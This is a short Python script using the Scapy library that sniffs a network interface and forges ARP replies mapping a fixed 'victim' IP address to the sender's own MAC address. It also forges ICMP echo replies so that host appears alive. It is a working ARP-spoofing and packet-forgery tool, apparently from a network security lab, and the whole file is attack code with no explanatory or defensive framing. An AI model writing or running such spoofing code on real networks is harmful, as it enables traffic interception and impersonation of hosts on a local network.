from scapy.all import *
from scapy.layers.inet import IP, ICMP
from scapy.layers.all import ARP

victim_ip_addr = '10.10.0.13'

def get_my_ip_addr():
    return get_if_addr("eth0")

def get_my_mac_addr():
    return get_if_hwaddr("eth0")

def send_arp_response(pkt):
    arp_pkt = pkt[ARP]
    if arp_pkt.op == 1:
        if arp_pkt.pdst == get_my_ip_addr() or arp_pkt.psrc == get_my_ip_addr():
            return
        if arp_pkt.pdst != victim_ip_addr:
            return
        print("Received an ARP request from {}".format(arp_pkt.psrc))
        print("Target IP address is {}".format(arp_pkt.pdst))
        # forge an ARP response
        forged_pkt = ARP()
        forged_pkt.ptype = 0x0800
        forged_pkt.hwlen = 6
        forged_pkt.plen = 4
        forged_pkt.op = 2
        forged_pkt.hwsrc = get_my_mac_addr()
        forged_pkt.psrc = arp_pkt.pdst
        forged_pkt.hwdst = arp_pkt.hwsrc
        forged_pkt.pdst = arp_pkt.psrc
        send(forged_pkt, verbose=0)

def send_echo_response(pkt):
    if pkt[IP].dst != victim_ip_addr:
        return
    print("Should send forged ICMP reply now")
    iphdr = IP(src=victim_ip_addr, dst=pkt[IP].src, ihl=pkt[IP].ihl)
    icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
    data = pkt[Raw].load
    forgedpkt = iphdr / icmp / data
    send(forgedpkt, verbose=0)

def handle_pkt(pkt):
    if ARP in pkt:
        send_arp_response(pkt)
    elif ICMP in pkt:
        send_echo_response(pkt)

if __name__ == '__main__':
    pkt = sniff(iface='eth0', filter='arp or icmp', prn=handle_pkt)
